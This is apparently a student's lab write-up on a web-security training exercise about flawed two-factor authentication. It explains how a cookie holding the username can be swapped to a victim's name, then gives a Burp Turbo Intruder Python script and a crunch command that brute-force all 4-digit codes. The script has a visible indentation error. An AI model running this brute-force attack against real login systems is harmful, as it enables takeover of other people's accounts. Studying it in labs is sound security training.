## Flawed two-factor verification logic
- flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

### Example
1. For example, the user logs in with their normal credentials in the first step as follows:
![[Flawed_two-factor_verification_logic1.png]]

2. They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
![[Flawed_two-factor_verification_logic2.png]]

3. When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
![[Flawed_two-factor_verification_logic3.png]]

4. In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.
![[Flawed_two-factor_verification_logic4.png]]
- This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username.
- They would never even need to know the user's password.

## Lab solution
Desc --> 2FA broken logic

1. Login with your own credentials:
![[2FA_broken_logic1.png]]
Now, log out of your account.

2. Now, change the verify parameter from "wiener" to victim username.
![[2FA_broken_logic2.png]]

3. Now, generate the 2fa code for carlos and after that follow from below:
4. Now, Send the above request to burp turbo intruder by right click on repeater > extensions > turbo intruder
5. paste the below script:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=2,
                           pipeline=False
                           )

       for i in range(10000):
           engine.queue(target.req, "{0:0>4}".format(i))

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status == 302:
        table.add(req)
```
Now, we are going to use another method to brute-force the 2fa code.

6. First, creating all the combinations of 2fa 4 digit code with crunch:
run the below command in terminal to generate all the combinations of 4 codes
```python
┌──(hyok㉿kali)-[~/Bof]
└─$ sudo crunch 4 4 0123456789 -o /tmp/2fa_codes.txt
```

7. script of turbo intruder:
![[2FA_broken_logic4.png]]

8. At the time of attack we get the desired result:
![[2FA_broken_logic5.png]]
Now, you can copy the correct 2fa code or you can also just right click on response and then copy the url and paste in the search bar.

